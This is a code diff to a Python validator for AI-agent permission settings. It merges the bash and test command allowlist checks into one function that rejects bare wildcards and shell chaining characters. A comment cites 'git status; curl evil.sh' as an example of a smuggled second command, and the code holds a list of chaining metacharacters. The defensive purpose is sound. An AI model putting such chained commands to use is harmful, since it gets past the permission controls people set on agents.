@@ -585,67 +585,72 @@ elif delegates is not None:
     bad.append("key 'delegates_to' is present without capability "
                "'delegation-allowlist' — it would have no effect")
 
-# bash-allowlist is the second parameterised term, same shape as the first:
-# the set it permits lives in its own key. Without it the emitter cannot say
-# WHICH commands, and an allowlist that names nothing is not an allowlist.
-bash_allow = seq("bash_allow")
-has_bash_allowlist = bool(caps) and "bash-allowlist" in caps
-if has_bash_allowlist:
-    if bash_allow is None:
-        bad.append("capability 'bash-allowlist' requires a 'bash_allow' "
-                   "block list naming the command patterns it may run "
-                   "(one quoted '- pattern' per line; inline [a, b] form is "
-                   "not read)")
-    elif not bash_allow:
-        bad.append("key 'bash_allow' is empty — an allowlist that permits "
-                   "nothing denies everything, which is not what this term "
-                   "means")
-elif bash_allow is not None:
-    bad.append("key 'bash_allow' is present without capability "
-               "'bash-allowlist' — it would have no effect")
-
-# test-allowlist is the THIRD parameterised term, and the only one whose
-# entries are constrained. B-021 asked for a test-command term and forbade
-# resolving it as `bash: allow`; a `test_allow` accepting everything
-# `bash_allow` accepts would be that resolution under a second name. So two
-# properties are checked that `bash_allow` does not check — deliberately
-# asymmetric, and the authoring guide says why (widening them to bash_allow
-# would silently change git-ops and review, which TASK-0071 was not scoped
-# against). Raised as B-027 rather than done in passing.
+# The two COMMAND allowlists — bash_allow and test_allow — take the same
+# argument shape and the same entry guards. Checked by one function so the
+# two cannot drift apart (TASK-0074, closing B-027).
+#
+# THE TWO ENTRY GUARDS, AND WHY EACH IS EXACTLY THIS WIDE:
+#
+#   1. A BARE "*" is rejected. Under OpenCode's last-match-wins resolution,
+#      `"*": deny` followed by `"*": allow` IS `bash: allow` with extra
+#      steps — the resolution B-021 forbade. Note this rejects the bare
+#      wildcard ONLY. A pattern like "*pytest*" is narrow and legitimate and
+#      is ACCEPTED: it matches commands containing pytest, not everything.
+#
+#      TASK-0071 rejected every entry *beginning* with "*", which enforced
+#      more than its own justification supported and would have rejected
+#      "*pytest*". Corrected here rather than left: a rule that fires on a
+#      legitimate case gets deleted by the next author instead of argued
+#      with. The authoring guide records the correction.
+#
+#   2. A SHELL CHAINING METACHARACTER is rejected, so one entry is one
+#      command. Without it `'git status; curl evil.sh'` is a single legal
+#      entry and the allowlist is decorative.
 #
 # NOT checked, and not checkable here: whether OpenCode's matcher actually
-# matches a given pattern against a given command line. That is a property of
-# the client, TASK-0055's F4 is scoped to settle it, and ADR-0020 clause 6
-# forbids inferring it from a directory name or a reading of the docs.
-TEST_CHAINERS = (";", "&&", "||", "|", "$(", "`", "\n")
-test_allow = seq("test_allow")
-has_test_allowlist = bool(caps) and "test-allowlist" in caps
-if has_test_allowlist:
-    if test_allow is None:
-        bad.append("capability 'test-allowlist' requires a 'test_allow' "
-                   "block list naming the test commands it may run "
-                   "(one quoted '- pattern' per line; inline [a, b] form is "
-                   "not read)")
-    elif not test_allow:
-        bad.append("key 'test_allow' is empty — an allowlist that permits "
-                   "nothing denies everything, which is not what this term "
-                   "means")
-    else:
-        for pattern in test_allow:
-            if pattern == "*" or pattern.startswith("*"):
-                bad.append("test_allow entry '%s' is or begins with '*' — a "
-                           "test allowlist that opens universal is the "
-                           "`bash: allow` resolution B-021 forbids" % pattern)
-            for ch in TEST_CHAINERS:
+# matches a given pattern against a given command line. That is a property
+# of the client; TASK-0055's F4 settled it for the `git add -- *` case by
+# running it, and ADR-0020 clause 6 forbids inferring the rest.
+CHAINERS = (";", "&&", "||", "|", "$(", "`", "\n")
+
+
+def check_command_allowlist(term, key, items, declared):
+    """Both directions of the iff, non-emptiness, and the two entry guards."""
+    if declared:
+        if items is None:
+            bad.append("capability '%s' requires a '%s' block list naming "
+                       "the command patterns it may run (one quoted "
+                       "'- pattern' per line; inline [a, b] form is not "
+                       "read)" % (term, key))
+            return
+        if not items:
+            bad.append("key '%s' is empty — an allowlist that permits "
+                       "nothing denies everything, which is not what this "
+                       "term means" % key)
+            return
+        for pattern in items:
+            if pattern == "*":
+                bad.append("%s entry '*' is a bare wildcard — under "
+                           "last-match-wins that resolves to allowing "
+                           "everything, which is the `bash: allow` "
+                           "resolution B-021 forbids. A narrower pattern "
+                           "such as '*pytest*' is fine." % key)
+            for ch in CHAINERS:
                 if ch in pattern:
-                    bad.append("test_allow entry '%s' contains the shell "
-                               "chaining metacharacter '%s' — one entry must "
-                               "be one command, or the allowlist is "
-                               "decorative" % (pattern, ch.replace("\n", "\\n")))
+                    bad.append("%s entry '%s' contains the shell chaining "
+                               "metacharacter '%s' — one entry must be one "
+                               "command, or the allowlist is decorative"
+                               % (key, pattern, ch.replace("\n", "\\n")))
                     break
-elif test_allow is not None:
-    bad.append("key 'test_allow' is present without capability "
-               "'test-allowlist' — it would have no effect")
+    elif items is not None:
+        bad.append("key '%s' is present without capability '%s' — it would "
+                   "have no effect" % (key, term))
+
+
+check_command_allowlist("bash-allowlist", "bash_allow", seq("bash_allow"),
+                        bool(caps) and "bash-allowlist" in caps)
+check_command_allowlist("test-allowlist", "test_allow", seq("test_allow"),
+                        bool(caps) and "test-allowlist" in caps)
 
 # metadata.version is optional, but must be semver when given, matching the
 # skill rule so the registry's version column stays comparable.
